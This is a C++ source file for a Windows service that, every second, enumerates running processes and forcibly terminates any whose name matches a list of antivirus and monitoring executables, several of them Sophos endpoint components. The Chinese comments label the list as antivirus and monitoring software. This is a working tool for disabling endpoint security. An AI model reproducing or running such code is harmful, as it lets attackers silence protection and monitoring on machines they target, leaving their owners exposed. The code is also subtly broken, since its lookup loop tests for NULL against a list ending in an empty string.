#include "GxxGmService.h"
#include <iostream>
#include <string>
#include <vector>
#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <Tlhelp32.h>

const TCHAR *apps[] = {
	_T("ALMon.exe"),				// 杀软&监控软件
	_T("ALsvc.exe"),				// 杀软&监控软件 
	_T("ManagementAgentNT.exe"),	// 杀软&监控软件
	_T("RouterNT.exe"),				// 杀软&监控软件
	_T("ssp.exe"),					// 杀软&监控软件
	_T("swc_service.exe"),			// 杀软&监控软件
	_T("SophosEndPoint+EXP.exe"),	// 杀软&监控软件
	_T("hmpalert.exe"),				// 杀软&监控软件
	_T("winrdlv3.exe"),				// 监控软件
	_T("ONacAgent.exe"),				// 监控软件 
	_T("xsupengine.exe"),
	_T("")
};

GxxGmService::GxxGmService(LPCTSTR ServiceName, LPCTSTR DisplayName)
: CNTService(ServiceName, DisplayName)
{

}

GxxGmService::~GxxGmService()
{

}

void GxxGmService::Run(DWORD argc, LPTSTR * argv)
{
	//
	while (true)
	{
		// 拍摄进程快照
		HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		//实例化后使用Process32First获取第一个快照的进程前必做的初始化操作  
		PROCESSENTRY32 pe;  
		pe.dwSize = sizeof(PROCESSENTRY32);

		BOOL bret = Process32First(hSnapShot, &pe);
		if (!bret)
		{
			printf("Take process snapshot failed. errcode : %d\n", GetLastError());
			break;
		}

		do 
		{
			TCHAR process_name[MAX_PATH] = {0};
			_tcscpy_s(process_name, MAX_PATH, pe.szExeFile);

			int index = 0;
			while (apps[index] != NULL)
			{
				const TCHAR *app_name = apps[index];
				if (_tcsicmp(process_name, app_name) == 0)
				{
					// 就是它了，调接口打开进程，结束掉
					DWORD process_id = pe.th32ProcessID;
					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, process_id);
					if (hProcess == NULL)
					{
						OutputDebugString(process_name);
						OutputDebugString(_T("\n"));
						printf("Open process %d falied. errcode : %d\n", process_id, GetLastError());
						break;
					}

					TerminateProcess(hProcess, 4);

					CloseHandle(hProcess);
				}

				++index;
			}
			//_tcslwr_s(process_name, MAX_PATH);

		} while (Process32Next(hSnapShot, &pe));

		Sleep(1000);
	}
}

void GxxGmService::Stop()
{
	//
}